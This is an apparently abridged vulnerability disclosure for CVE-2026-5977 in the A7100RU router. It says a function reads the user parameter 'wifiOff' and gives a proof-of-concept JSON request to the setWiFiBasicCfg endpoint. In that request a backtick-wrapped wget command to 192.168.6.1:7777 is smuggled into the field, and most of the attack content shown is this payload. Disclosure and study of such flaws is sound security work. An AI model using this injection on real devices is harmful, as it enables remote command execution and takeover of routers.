# A7100RU Vulnerability（CVE-2026-5977）
...
In sub_42869C function, it reads in a user-provided parameter `wifiOff` .
...
{"topicurl":"setWiFiBasicCfg","addEffect":"1","wifiOff":"`wget 192.168.6.1:7777/testpoc`"
}
```
